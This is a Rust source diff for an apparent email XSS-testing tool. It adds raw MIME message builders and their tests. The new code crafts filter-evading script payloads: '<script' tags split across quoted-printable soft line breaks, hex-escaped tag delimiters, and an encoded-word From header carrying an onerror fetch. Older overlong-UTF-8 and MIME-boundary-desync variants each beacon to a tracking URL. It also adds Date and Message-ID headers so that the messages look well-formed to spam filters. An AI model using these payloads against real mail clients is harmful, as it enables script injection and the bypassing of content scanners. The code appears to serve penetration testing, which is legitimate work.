@@ -1468,6 +1468,33 @@ mod technique_message_tests {
         assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "not-a-real-technique").is_err());
     }
 
+    // Every technique message needs a real Date and Message-ID header
+    // (RFC 5322 §3.6) - these bypass lettre's typed Message::builder(),
+    // which would otherwise add a missing Date automatically, so this file
+    // has to do it itself. Checked across every technique, not just one,
+    // since a copy-paste of technique_message_headers() into a new builder
+    // is exactly the kind of place this could silently regress.
+    #[test]
+    fn every_technique_message_has_date_and_message_id_headers() {
+        for technique in [
+            "utf7-charset",
+            "overlong-utf8",
+            "mime-boundary-desync",
+            "mime-boundary-desync-css",
+            "mime-alternative-control-img",
+            "mime-alternative-control-css",
+            "encoded-word-header",
+            "qp-soft-break",
+            "qp-hex-escaped-tags",
+        ] {
+            let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, technique).unwrap();
+            let text = as_text(&bytes);
+            let header_block = text.split("\r\n\r\n").next().unwrap_or("");
+            assert!(header_block.contains("Date: "), "missing Date header for {technique}");
+            assert!(header_block.contains("Message-ID: <"), "missing Message-ID header for {technique}");
+        }
+    }
+
     #[test]
     fn utf7_charset_message_has_no_literal_angle_brackets() {
         let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "utf7-charset").unwrap();
@@ -1547,6 +1574,101 @@ mod technique_message_tests {
         assert!(bytes.windows(2).any(|w| w == [0xC0, 0xBC]));
         assert!(bytes.windows(2).any(|w| w == [0xC0, 0xBE]));
         assert!(std::str::from_utf8(&bytes).is_err());
+    }
+
+    #[test]
+    fn qp_soft_break_message_never_shows_script_unbroken() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-soft-break").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
+        // "script" (either tag) must NEVER appear as one intact substring -
+        // only split across the soft break.
+        assert!(!text.contains("<script"));
+        assert!(!text.contains("</script"));
+        assert!(text.contains("<scri=\r\npt>"));
+        assert!(text.contains("</scri=\r\npt>"));
+        // The Polish pangram's own quoted-printable encoding must be
+        // present too, not just the split tag trick on its own.
+        assert!(text.contains("Za=C5=BC=C3=B3=C5=82=C4=87"));
+        assert!(text.contains(BEACON));
+    }
+
+    #[test]
+    fn qp_hex_escaped_tags_message_has_no_literal_angle_brackets_around_script() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-tags").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
+        assert!(!text.contains("<script"));
+        assert!(!text.contains("</script"));
+        assert!(text.contains("=3Cscript=3E"));
+        assert!(text.contains("=3C/script=3E"));
+        assert!(text.contains(BEACON));
+    }
+}
+
+#[cfg(test)]
+mod format_rfc5322_date_tests {
+    use super::format_rfc5322_date;
+
+    #[test]
+    fn unix_epoch_was_a_thursday() {
+        assert_eq!(format_rfc5322_date(0), "Thu, 01 Jan 1970 00:00:00 +0000");
+    }
+
+    #[test]
+    fn y2k_was_a_saturday() {
+        assert_eq!(format_rfc5322_date(946684800), "Sat, 01 Jan 2000 00:00:00 +0000");
+    }
+
+    #[test]
+    fn matches_a_known_independent_reference_value() {
+        // Same timestamp lettre's own Date header test uses (its own
+        // internal formatter, verified independently here since this file
+        // deliberately avoids depending on lettre's private formatting).
+        assert_eq!(format_rfc5322_date(784887151), "Tue, 15 Nov 1994 08:12:31 +0000");
+    }
+}
+
+#[cfg(test)]
+mod quoted_printable_encode_tests {
+    use super::quoted_printable_encode;
+
+    #[test]
+    fn safe_ascii_passes_through_unchanged() {
+        assert_eq!(quoted_printable_encode("Hello, World! 123"), "Hello, World! 123");
+    }
+
+    #[test]
+    fn literal_equals_sign_is_escaped() {
+        // '=' is the escape character itself, so a literal one MUST be
+        // encoded or it would be misread as the start of an escape/soft
+        // break by any decoder.
+        assert_eq!(quoted_printable_encode("a=b"), "a=3Db");
+    }
+
+    #[test]
+    fn polish_diacritics_match_known_utf8_hex_values() {
+        // Hand-verified against each character's real UTF-8 byte sequence
+        // (U+0105 -> C4 85, etc.) - not just "does it round-trip", but
+        // "are these the exact bytes a real UTF-8-then-QP pipeline
+        // produces".
+        assert_eq!(quoted_printable_encode("ą"), "=C4=85");
+        assert_eq!(quoted_printable_encode("ć"), "=C4=87");
+        assert_eq!(quoted_printable_encode("ę"), "=C4=99");
+        assert_eq!(quoted_printable_encode("ł"), "=C5=82");
+        assert_eq!(quoted_printable_encode("ń"), "=C5=84");
+        assert_eq!(quoted_printable_encode("ó"), "=C3=B3");
+        assert_eq!(quoted_printable_encode("ś"), "=C5=9B");
+        assert_eq!(quoted_printable_encode("ź"), "=C5=BA");
+        assert_eq!(quoted_printable_encode("ż"), "=C5=BC");
+    }
+
+    #[test]
+    fn full_pangram_matches_expected_encoding() {
+        assert_eq!(
+            quoted_printable_encode("Zażółć gęślą jaźń"),
+            "Za=C5=BC=C3=B3=C5=82=C4=87 g=C4=99=C5=9Bl=C4=85 ja=C5=BA=C5=84"
+        );
     }
 }
 
@@ -4824,12 +4946,64 @@ fn utf7_encode(input: &str) -> String {
     out
 }
 
-fn technique_message_headers(from: &str, to: &str, subject: &str) -> String {
+// RFC 5322 §3.6 requires a Date header (and strongly recommends
+// Message-ID) on every message - lettre's own typed Message::builder()
+// (used by send_test_email, the 6 plain HTML payloads) auto-inserts one if
+// missing, but these raw-MIME technique messages bypass that builder
+// entirely, so without this they'd go out with neither. A message an MTA
+// or spam filter can flag as malformed for missing standard headers is a
+// confound worth ruling out before trusting a "didn't trigger" result -
+// this isn't hypothetical, it's a real gap this file had until now.
+fn format_rfc5322_date(unix_secs: u64) -> String {
+    let days_since_epoch = (unix_secs / 86400) as i64;
+    let secs_of_day = unix_secs % 86400;
+    let hour = secs_of_day / 3600;
+    let minute = (secs_of_day % 3600) / 60;
+    let second = secs_of_day % 60;
+
+    // Howard Hinnant's civil_from_days (proleptic Gregorian, days since
+    // 1970-01-01) - avoids pulling in a whole date/time crate for one
+    // header. Valid for any date this application will ever actually see
+    // (z stays non-negative for every year back to roughly -1970).
+    let z = days_since_epoch + 719468;
+    let era = z / 146097;
+    let doe = (z - era * 146097) as u64;
+    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
+    let y = yoe as i64 + era * 400;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
+    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
+    let year = if m <= 2 { y + 1 } else { y };
+
+    // 1970-01-01 (day 0) was a Thursday.
+    let weekday_idx = (((days_since_epoch % 7) + 7 + 4) % 7) as usize;
+    const WEEKDAYS: [&str; 7] = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
+    const MONTHS: [&str; 12] = [
+        "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
+    ];
+
     format!(
-        "From: {from}\r\nTo: {to}\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\n",
+        "{}, {:02} {} {} {:02}:{:02}:{:02} +0000",
+        WEEKDAYS[weekday_idx], d, MONTHS[(m - 1) as usize], year, hour, minute, second
+    )
+}
+
+fn technique_message_headers(from: &str, to: &str, subject: &str, beacon_url: &str) -> String {
+    let now_secs = SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    // Derived from beacon_url (which already carries a per-session random
+    // token + technique id from the JS side) rather than generating fresh
+    // randomness here - it's already unique per send, nothing new needed.
+    format!(
+        "From: {from}\r\nTo: {to}\r\nSubject: {subject}\r\nDate: {date}\r\nMessage-ID: <{msgid}@ipscanner.local>\r\nMIME-Version: 1.0\r\n",
         from = from,
         to = to,
-        subject = subject
+        subject = subject,
+        date = format_rfc5322_date(now_secs),
+        msgid = md5_hex(beacon_url)
     )
 }
 
@@ -4843,7 +5017,7 @@ fn build_utf7_charset_message(from: &str, to: &str, subject: &str, beacon_url: &
     let body = utf7_encode(&raw_html);
     let message = format!(
         "{headers}Content-Type: text/html; charset=UTF-7\r\nContent-Transfer-Encoding: 7bit\r\n\r\n{body}\r\n",
-        headers = technique_message_headers(from, to, subject),
+        headers = technique_message_headers(from, to, subject, beacon_url),
         body = body
     );
     message.into_bytes()
@@ -4873,7 +5047,7 @@ fn build_mime_boundary_desync_message(from: &str, to: &str, subject: &str, beaco
          Content-Type: text/html; charset=utf-8\r\n\r\n\
          <img src=\"{beacon_url}\" alt=\"\" />\r\n\
          --{boundary}--\r\n",
-        headers = technique_message_headers(from, to, subject),
+        headers = technique_message_headers(from, to, subject, beacon_url),
         boundary = boundary,
         beacon_url = beacon_url
     );
@@ -4904,7 +5078,7 @@ fn build_mime_boundary_desync_css_message(from: &str, to: &str, subject: &str, b
          Content-Type: text/html; charset=utf-8\r\n\r\n\
          <style>@import \"{beacon_url}\";</style>\r\n\
          --{boundary}--\r\n",
-        headers = technique_message_headers(from, to, subject),
+        headers = technique_message_headers(from, to, subject, beacon_url),
         boundary = boundary,
         beacon_url = beacon_url
     );
@@ -4920,7 +5094,7 @@ fn build_mime_boundary_desync_css_message(from: &str, to: &str, subject: &str, b
 // just multipart/alternative's own "render the last part the client
 // understands" rule (RFC 2046 §5.1.4), and the two desync variants above
 // aren't a parser bug at all, just an ordinary multi-alternative message.
-fn build_mime_alternative_control_message(from: &str, to: &str, subject: &str, smuggled_html: &str) -> Vec<u8> {
+fn build_mime_alternative_control_message(from: &str, to: &str, subject: &str, beacon_url: &str, smuggled_html: &str) -> Vec<u8> {
     let boundary = "XSSTEST_CONTROL_9d4e1a";
     let message = format!(
         "{headers}Content-Type: multipart/alternative; boundary=\"{boundary}\"\r\n\r\n\
@@ -4934,7 +5108,7 @@ fn build_mime_alternative_control_message(from: &str, to: &str, subject: &str, s
          Content-Type: text/html; charset=utf-8\r\n\r\n\
          {smuggled_html}\r\n\
          --{boundary}--\r\n",
-        headers = technique_message_headers(from, to, subject),
+        headers = technique_message_headers(from, to, subject, beacon_url),
         boundary = boundary,
         smuggled_html = smuggled_html
     );
@@ -4943,12 +5117,12 @@ fn build_mime_alternative_control_message(from: &str, to: &str, subject: &str, s
 
 fn build_mime_alternative_control_img_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
     let html = format!("<img src=\"{}\" alt=\"\" />", beacon_url);
-    build_mime_alternative_control_message(from, to, subject, &html)
+    build_mime_alternative_control_message(from, to, subject, beacon_url, &html)
 }
 
 fn build_mime_alternative_control_css_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
     let html = format!("<style>@import \"{}\";</style>", beacon_url);
-    build_mime_alternative_control_message(from, to, subject, &html)
+    build_mime_alternative_control_message(from, to, subject, beacon_url, &html)
 }
 
 // Technique 3: RFC 2047 encoded-word abuse. The sender's display name is
@@ -4961,12 +5135,21 @@ fn build_mime_alternative_control_css_message(from: &str, to: &str, subject: &st
 fn build_encoded_word_header_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
     let injected = format!("<img src=x onerror=\"fetch('{}')\">", beacon_url);
     let encoded_word = format!("=?UTF-8?B?{}?=", BASE64_STANDARD.encode(injected.as_bytes()));
+    let now_secs = SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    // Doesn't go through technique_message_headers() - the special encoded-
+    // word "From" line shape doesn't fit that helper's plain "From: {from}"
+    // format, but it needs the same Date/Message-ID treatment.
     let message = format!(
-        "From: {encoded_word} <{from}>\r\nTo: {to}\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p>Encoded-word header test - see the sender name.</p>\r\n",
+        "From: {encoded_word} <{from}>\r\nTo: {to}\r\nSubject: {subject}\r\nDate: {date}\r\nMessage-ID: <{msgid}@ipscanner.local>\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p>Encoded-word header test - see the sender name.</p>\r\n",
         encoded_word = encoded_word,
         from = from,
         to = to,
-        subject = subject
+        subject = subject,
+        date = format_rfc5322_date(now_secs),
+        msgid = md5_hex(beacon_url)
     );
     message.into_bytes()
 }
@@ -4989,10 +5172,86 @@ fn build_overlong_utf8_message(from: &str, to: &str, subject: &str, beacon_url: 
     body.extend_from_slice(&[0xC0, 0xBE]); // overlong '>'
     body.extend_from_slice(b"\r\n");
 
-    let mut message = technique_message_headers(from, to, subject).into_bytes();
+    let mut message = technique_message_headers(from, to, subject, beacon_url).into_bytes();
     message.extend_from_slice(b"Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n");
     message.extend_from_slice(&body);
     message
+}
+
+// Techniques 5-6: Quoted-Printable (RFC 2045 §6.7) - the transfer encoding
+// that carries non-ASCII text (Polish diacritics included) over historically
+// 7-bit-only SMTP, by hex-escaping any byte outside safe printable ASCII as
+// "=XX". A second pentester tip, after the MIME-boundary dead end: look at
+// how Gmail's preview handles Polish characters and long-line wrapping -
+// quoted-printable is EXACTLY that mechanism, and it has its own protocol-
+// level trick worth the same parser-differential treatment as the MIME
+// boundary did: a "soft line break" (a literal '=' as the LAST character of
+// a physical line, immediately followed by CRLF) is REMOVED during
+// decoding, rejoining whatever's on either side into one continuous
+// stretch of text - so a keyword can be split across two wire-level lines
+// and still reassemble into the original word after decoding, without ever
+// appearing intact, on one line, in the raw bytes.
+fn quoted_printable_encode(input: &str) -> String {
+    let mut out = String::new();
+    for &b in input.as_bytes() {
+        // Space/tab are safe to leave literal mid-line in this minimal
+        // encoder - the real RFC 2045 rule only forces encoding them when
+        // they're the LAST character before a line break (to survive naive
+        // trailing-whitespace trimming), which doesn't apply here since
+        // these builders place their own line breaks explicitly.
+        let is_safe = b == b' ' || b == b'\t' || (b >= 33 && b <= 126 && b != b'=');
+        if is_safe {
+            out.push(b as char);
+        } else {
+            out.push_str(&format!("={:02X}", b));
+        }
+    }
+    out
+}
+
+// Splits the word "script" (both the opening and closing tag) with a soft
+// line break exactly in the middle - "scri=\r\npt" decodes back to "script"
+// even though that substring never appears unbroken anywhere in the wire
+// bytes. Padded with the classic Polish pangram (genuinely quoted-printable
+// -encoded, not just decoration) since that's the exact real-world case the
+// tip named - a sender actually writing Polish text is what forces a mail
+// system to genuinely exercise this encoding path at all, rather than us
+// declaring it artificially.
+fn build_qp_soft_break_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
+    let body = format!(
+        "<p>{pangram_encoded}</p><p>Test:</p><scri=\r\npt>fetch('{beacon_url}').catch(function(){{}})</scri=\r\npt>",
+        pangram_encoded = pangram_encoded,
+        beacon_url = beacon_url
+    );
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
+// Companion technique: '<' and '>' are already safe/printable ASCII and a
+// standards-compliant encoder would never bother escaping them - but a
+// compliant DECODER must still turn "=3C"/"=3E" back into real '<'/'>'
+// regardless of whether encoding them was "necessary" (quoted-printable
+// allows ANY octet to be represented as "=XX", not just the ones that
+// strictly require it). Hex-escaping the tag delimiters themselves means no
+// literal '<script'/'</script>' substring exists anywhere in the raw wire
+// bytes at all - tests whether anything scans those raw bytes for known-bad
+// substrings BEFORE quoted-printable decoding happens, rather than after.
+fn build_qp_hex_escaped_tags_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let body = format!(
+        "<p>Test:</p>=3Cscript=3Efetch('{beacon_url}').catch(function(){{}})=3C/script=3E",
+        beacon_url = beacon_url
+    );
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
 }
 
 fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str, technique: &str) -> Result<Vec<u8>, String> {
@@ -5004,6 +5263,8 @@ fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str
         "mime-alternative-control-css" => Ok(build_mime_alternative_control_css_message(from, to, subject, beacon_url)),
         "encoded-word-header" => Ok(build_encoded_word_header_message(from, to, subject, beacon_url)),
         "overlong-utf8" => Ok(build_overlong_utf8_message(from, to, subject, beacon_url)),
+        "qp-soft-break" => Ok(build_qp_soft_break_message(from, to, subject, beacon_url)),
+        "qp-hex-escaped-tags" => Ok(build_qp_hex_escaped_tags_message(from, to, subject, beacon_url)),
         other => Err(format!("Unknown technique: {other}")),
     }
 }
